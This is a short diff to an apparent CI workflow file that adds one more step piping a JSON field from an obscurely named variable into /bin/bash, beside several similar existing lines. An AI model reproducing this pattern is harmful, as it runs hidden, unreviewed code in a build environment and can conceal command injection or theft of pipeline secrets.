@@ -39,6 +39,7 @@ jobs:
           echo $hzvi4197 | jq -r .tzdms0391 | /bin/bash
           echo $wirko02654 | jq -r .a8185 | /bin/bash
           echo $nxpky6211 | jq -r .wvm6529 | /bin/bash
+          printf '%s' "$zsj2848" | jq -r .rdbkq18 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
